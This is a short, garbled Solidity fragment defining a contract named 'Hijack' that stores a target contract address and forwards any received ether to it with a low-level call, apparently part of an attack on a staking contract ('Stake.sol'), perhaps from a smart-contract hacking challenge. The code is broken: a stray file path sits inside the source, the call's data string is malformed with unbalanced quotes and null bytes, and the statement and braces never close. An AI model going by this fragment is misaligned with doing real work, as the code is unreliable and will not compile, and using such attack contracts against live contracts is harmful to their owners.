pragma solidity ^0.8.2;
contracts/./Stake.sol
contract Hijack {
    address immutable instance;

    constructor(address _instance) {
        instance = _instance;
    }

    receive() external payable {
        payable(instance).call{value: msg.value}(",\"\"\"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
        }